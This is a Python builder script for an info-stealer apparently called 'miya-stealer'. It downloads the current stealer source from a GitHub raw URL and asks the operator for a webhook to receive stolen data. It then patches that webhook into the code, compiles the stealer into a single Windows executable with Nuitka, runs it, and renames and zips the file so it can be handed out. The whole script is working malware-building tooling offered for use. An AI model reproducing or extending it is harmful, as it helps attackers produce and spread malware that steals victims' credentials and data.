import os
import requests
import sys
import time
import zipfile


os.system('cls')
print('''

 #   #  ####   #       ##     ##    #   #  ####                 #####   ##                  #   #  ###    #   #    #   
 #   #  #      #      #  #   #  #   ## ##  #                      #    #  #                 ## ##   #     #   #   # #  
 # # #  ###    #      #      #  #   # # #  ###                    #    #  #                 # # #   #      # #   #   # 
 # # #  #      #      #      #  #   # # #  #                      #    #  #                 # # #   #       #    ##### 
 ## ##  #      #      #  #   #  #   #   #  #                      #    #  #                 #   #   #       #    #   # 
 #   #  ####   ####    ##     ##    #   #  ####                   #     ##                  #   #  ###      #    #   # 
                                                                                                                       
                      compiling maybe take a while...         a long while :3 
                      ''')

print("Checking Stealer Version...")
time.sleep(2)
### Check Version of the Stealer
Version = requests.get("https://raw.githubusercontent.com/e-bitchs/miya-stealer/main/main.py")
content = Version.text
if Version.status_code == 200:
    with open("main.py", "w", encoding="utf-8") as file:
        file.truncate(0)
    with open("main.py", "w", encoding="utf-8") as file:
        file.write(content)

    print("Version Updated! \n")
    time.sleep(1)
else:
    print("Error!")
    time.sleep(4)
    os.system("cls")
    sys.exit("bye...")
new_value = input("Enter your webhook: ")
with open("main.py", "r+") as file:
    contents = file.readlines()
    contents[25] = f"hook = '{new_value}'\n"
    file.seek(0)
    file.writelines(contents)
    file.truncate()
os.system("pip install nuitka")
os.system("nuitka --onefile main.py")
os.system("main.exe")
print("COMPILED!")
def rename_file():
    file1 = "main.exe"
    new_file_name = input("Enter the new name for the file (without .exe): ")
    new_file_name2 = new_file_name + ".exe"
    os.rename(file1, new_file_name2)

    with zipfile.ZipFile(new_file_name + ".zip", 'w') as myzip:
        myzip.write(new_file_name2)
rename_file()
